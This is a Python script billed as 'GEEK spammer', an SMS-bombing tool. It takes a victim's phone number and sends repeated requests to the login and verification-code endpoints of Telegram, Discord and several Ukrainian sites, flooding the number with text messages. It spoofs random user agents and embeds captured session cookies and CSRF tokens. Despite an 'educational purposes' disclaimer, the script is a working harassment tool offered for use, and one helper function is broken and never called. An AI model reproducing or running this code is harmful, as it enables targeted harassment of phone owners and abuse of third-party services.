#----------------------------------------------------------------
import requests,fake_useragent,time,os,threading,fabulous
from fabulous import text
from threading import Thread
from rich.console import Console
from rich.progress import *
#----------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#----------------------------------------------------------------
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
    phone_plus = "+" + number
#----------------------------------------------------------------
def out_red():
    print(text.Text("GEEK", color='00ff00', shadow=True, skew=1))
    print(text.Text("spammer", color='ff0000', shadow=True, skew=1))
out_red()   
#----------------------------------------------------------------
console.print('''
[red]
!!!The creator is not responsible for your actions. This program was created for educational purposes. !!!
(created by GEEK using python3)            
''')
console.print('''[green]
 Telegram_GROUP - [purple] https://t.me/GEEK_GROUP_123
 [green]
  My_YouTube_channel -[purple] https://www.youtube.com/channel/UCVBFn5D1N_awrQN5oMRJEZQ 
       [green]              SUBSCRIBE PLEASE
''')
#----------------------------------------------------------------
console.print('[yellow] Введите  номер телефонa (+можно не писать) ')

number = console.input('[green]GEEK>>> ')
#----------------------------------------------------------------
run = int(console.input('[purple]Введите количество повторов (1-10):\n[green]GEEK>>> '))
#----------------------------------------------------------------
for _ in track(range(run)):
         headers = {"User-Agent": fake_useragent.UserAgent().random}
         try:#ok
                 requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                 console.print('[green]telegram')
         except:
                 console.print('Не отправлено (telegram)')
         try:#ok/no
                 requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
                 console.print('[green]discord')
         except:
                 console.print('Не отправлено (discord)')
         try:#ok
                 requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
                 console.print('[green]mozayka.com.ua')
         except:
                 console.print('Не отправлено (mozayka.com.ua)')
         try:#ok
                 requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
                 console.print('[green]kazan-divan.eatery.club')
         except:
                 console.print('Не доставлено (kazan-divan.eatery.club)')
         try:
                 requests.post('https://dnipro-m.ua/uk/phone-verification/', data={'phone': number}, headers={'X-Requested-With':'XMLHttpRequest', 'x-xss-protection': '1; mode=block', 'cookie': 'PHPSESSID=mjgof64ae33gd9g4rpto23utbs; session_hash=ecf0f036b9519cd8eae6640d1cb07bc2; gclid=939156d81035356c746423ecca0a2cf4a2748f879bd3dc65cfa6250fb7064ccea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22gclid%22%3Bi%3A1%3Bs%3A8%3A%22dnipro-m%22%3B%7D; language=0480298520a8be04ccfd813520616a13a8aa0fb2db683a1126b77f187eca16c3a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22uk%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=bef2130445b5ccea33c7703f35273eab653c9ac5572def7b93a0fb02b25a556ca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22SqzDL32pQojiQqc2Y50FzsdgD6Pmq8ma%22%3B%7D; _gcl_au=1.1.271637781.1635439209; _gcl_aw=GCL.1635439211.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB; ab_1=2; _gid=GA1.2.377104572.1635439214; _dc_gtm_UA-87493814-1=1; _hjid=1ba8c8eb-f5de-4eb6-b07d-54a7b2e30c70; _hjFirstSeen=1; sc=C91E5BF3-A5C7-774E-FA5A-76E87C65E828; _gat_UA-87493814-1=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1635439214.1.0.1635439215.59; _ga=GA1.2.2011064152.1635439214; __zlcmid=16mkRHVrtBTC1Fc; _gac_UA-87493814-1=1.1635439240.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'referer': 'https://dnipro-m.ua/uk/?gclid=Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'x-csrf-token': 'koW-Ul6Vmcd9-M963uo7FTOT3bZQyePOrFDxs4Si7S3B9MQWEqartyyXpROPm1gnaqbt8Cq6h6noZqHe9ZqATA==', 'x-requested-with': 'XMLHttpRequest', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]dnipro-m.ua')
         except:
                 console.print('Не отправлено (dnipro-m.ua)')
         try:
                 requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', json={'username':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]uklon.com.ua')
         except:
                 console.print('Не отправлено (uklon.com.ua)')
         try:
                 requests.post('https://ucb.z.apteka24.ua/api/send/otp', json={'phone':number}, headers={'X-Requested-With':'XMLHttpRequest', 'link': '<https://ucb.z.apteka24.ua/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"', 'server': 'nginx/1.17.10', 'vary': 'Accept', 'x-content-type-options': 'nosniff', 'x-frame-options': 'deny', 'x-powered-by': 'PHP/7.4.21', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, private', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]apteka24.ua')
         except:
                 console.print('Не отправлено (apteka24.ua)')
         try:
                 requests.post('https://my.telegram.org/auth/send_password', json={"phone": number})
                 console.print('[green]telegram')
         except:
                 console.print('Не доставлено (telegram)')